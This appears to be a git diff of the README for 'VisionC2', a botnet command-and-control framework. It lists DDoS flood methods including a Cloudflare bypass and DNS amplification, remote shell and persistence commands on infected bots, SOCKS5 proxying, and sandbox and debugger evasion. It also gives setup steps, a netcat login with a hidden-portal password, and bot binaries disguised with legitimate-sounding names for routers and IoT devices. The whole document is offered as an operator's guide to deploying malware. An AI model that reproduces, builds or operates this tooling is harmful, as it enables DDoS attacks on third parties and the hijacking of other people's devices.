@@ -15,56 +15,37 @@
 
 ---
 
-## ✨ Features
+## 🤖 Features
 
-### Bot Capabilities
-- **Layer 4 Attacks** — UDP, TCP, SYN, ACK, GRE, and DNS flood methods
-- **Layer 7 Attacks** — HTTP/HTTPS/TLS with **HTTP/2 fingerprinting** and **Cloudflare UAM bypass**
-- **Remote Execution** — **Interactive per-bot shell** and **fire-and-forget broadcast commands**
-- **SOCKS5 Proxy** — Convert any agent into a **high-performance SOCKS5 proxy server** on demand
-
-### CNC & TUI Interface
-- **Full-screen TUI** (Terminal User Interface) for Command & Control
-- **Real-time dashboard** with bot management and live statistics
-- **Visual attack builder** with detailed metrics
-- **Single-Agent Control** — fully interactive per-bot shell interface
-- **Broadcast Shell Execution** — Powerful filters by **architecture**, **RAM amount**, **bot count**, and more
-- **Built-in SOCKS5 Proxy Manager** — One-click start/stop per bot or in bulk operations
-
-### Encryption & Stealth
-- **TLS 1.3** with **Perfect Forward Secrecy**
-- **HMAC challenge-response** authentication system
-- **Multi-layer obfuscation** — RC4 → XOR → byte substitution → MD5
-- **Anti-analysis & evasion** — **Sandbox detection** • **VM detection** • **Debugger detection**
+| Command | Description |
+|---------|-------------|
+| `!shell`, `!exec` | Execute command with output |
+| `!stream` | Real-time command streaming output |
+| `!detach`, `!bg` | Run command in background |
+| `!stop` | Stop all attacks |
+| `!udpflood` | UDP flood attack |
+| `!tcpflood` | TCP connection flood |
+| `!http` | HTTP POST flood |
+| `!https`, `!tls` | HTTPS/TLS flood |
+| `!cfbypass` | Cloudflare bypass flood |
+| `!syn` | Raw SYN flood |
+| `!ack` | Raw ACK flood |
+| `!gre` | GRE protocol flood |
+| `!dns` | DNS Amp flood |
+| `!persist` | Setup persistence |
+| `!kill` | Terminate bot |
+| `!info` | Get system info |
+| `!socks` | Start SOCKS5 proxy |
+| `!stopsocks` | Stop SOCKS5 proxy 
 
 ---
 
 ## 🚀 Quick Start
 
-### 📋 Prerequisites
-
-#### **System Requirements**
-- **Operating System**: Linux (recommended), macOS, or Windows (WSL2)
-- **Memory**: 2GB+ RAM (4GB+ recommended)
-- **Hosting**: 1 VPS + 1 Registered Domain(optional) (for C2 server)
-
-#### **Package Installation**
-
 **Ubuntu/Debian:**
 ```bash
 sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen build-essential
 ```
-
-**CentOS/RHEL/Fedora:**
-```bash
-sudo yum install -y upx openssl git wget gcc python3 screen make
-# or for newer Fedora:
-sudo dnf install -y upx openssl git wget gcc python3 screen make
-```
-
----
-
-## ⚙️ Installation & Setup
 
 ### **Step 1: Clone Repository**
 ```bash
@@ -90,39 +71,6 @@ The setup script will:
 - Bot Binaries: `./VisionC2/bins/`
 - Configuration: `setup_config.txt`
 
----
-
-## 📁 File Structure
-
-```
-VisionC2/
-├── server                  # Compiled CNC server
-├── setup.py               # Interactive setup script
-├── setup_config.txt       # Generated configuration
-├── users.json            # User database (Telnet mode)
-├── cnc/certificates/                # TLS certificates
-│   ├── server.crt
-│   └── server.key
-├── bins/                 # Compiled bot binaries
-│   ├── kworkerd0        # x86 Linux
-│   ├── ethd0           # x86_64 Linux
-│   ├── mdsync1         # ARMv7
-│   └── ...
-├── bot/                  # Bot source code
-│   ├── main.go
-│   ├── attacks.go
-│   └── ...
-├── tools/                  # Bot source code
-│   ├── deupx.py         # UPX stripper/packer
-│   ├── build.sh         # Vision Cross Compiler
-│   └── ...
-└── Docs/                 # Documentation
-    ├── USAGE.md
-    ├── COMMANDS.md
-    └── CHANGELOG.md
-    
-```
----
 
 ## 🖥️ Running the C2 Server
 
@@ -144,9 +92,46 @@ screen ./server --split
 nc your-server-ip 1337
 # Login with "spamtec" to access hidden portal
 ```
+> [COMMANDS.md](Docs/COMMANDS.md) | **Complete CNC command reference**  
+---
 
-[COMMANDS.md](Docs/COMMANDS.md) | **Complete CNC command reference**  
+## 📁 File Structure
 
+```
+
+VisionC2/
+├── go.mod                  # Go module (Vision), Go 1.24
+├── go.sum
+├── setup.py                # Interactive setup wizard (Python 3)
+├── server                  # Compiled CNC binary
+├── bot/                    # Bot agent source
+│   ├── main.go             # Entry point, config, shell exec, main loop
+│   ├── connection.go       # TLS connection, DNS resolution, auth, C2 handler
+│   ├── attacks.go          # L4/L7 DDoS attack methods + proxy support
+│   ├── opsec.go            # Encryption, sandbox detection, bot ID generation
+│   ├── persist.go          # Persistence mechanisms (cron, systemd, rc.local)
+│   └── socks.go            # SOCKS5 proxy server implementation
+├── cnc/                    # CNC server source
+│   ├── main.go             # Server entry, TLS listener, user listener
+│   ├── connection.go       # TLS config, bot auth handler, bot management
+│   ├── cmd.go              # Command dispatch, user session handler, help menus
+│   ├── ui.go               # Bubble Tea TUI (dashboard, bot list, attack builder)
+│   ├── miscellaneous.go    # User auth, permissions (RBAC), utilities
+│   ├── users.json          # User credential database
+│   └── certificates/       # TLS certs (server.crt, server.key)
+├── tools/
+│   ├── build.sh            # Cross-compilation for 14 architectures
+│   └── deUPX.py            # UPX signature stripper
+├── bins/                   # Compiled bot binaries (output)
+└── Docs/
+    ├── ARCHITECTURE.md     # Technical overview
+    ├── COMMANDS.md          # TUI hotkey reference
+    ├── USAGE.md             # Usage guide
+    ├── CHANGELOG.md         # Version history
+    └── LICENSE
+```
+    
+---
 Bot binaries are automatically cross-compiled to `bot/bins/`.
 
 ---
@@ -160,12 +145,6 @@ Bot binaries are automatically cross-compiled to `bot/bins/`.
 | `ip6addrd`  | ARM64        | Raspberry Pi 4, Android, AWS Graviton | 2.2 MB |
 | `httpd`     | MIPS         | Routers, IoT devices | 2.4 MB |
 | `+12 more`  | PPC64, RISC-V, s390x, loong64, etc. | Various embedded systems | 1.8-2.5 MB |
-
-**Stealth Features:**
-- All binaries UPX-packed and stripped
-- Legitimate-sounding process names
-- No external dependencies (statically linked)
-- Small memory footprint
 ---
 ## 📜 Documentation
 
@@ -174,6 +153,7 @@ Bot binaries are automatically cross-compiled to `bot/bins/`.
 | [USAGE.md](Docs/USAGE.md)    | Full setup, deployment, and TUI guide            |
 | [COMMANDS.md](Docs/COMMANDS.md) | Complete CNC command reference              |
 | [CHANGELOG.md](Docs/CHANGELOG.md) | Version history and breaking changes         |
+| [ARCHITECTURE.md](Docs/ARCHITECTURE.md) | Detailed technical breakdown         |
 
 ## 🛣️ Roadmap
 
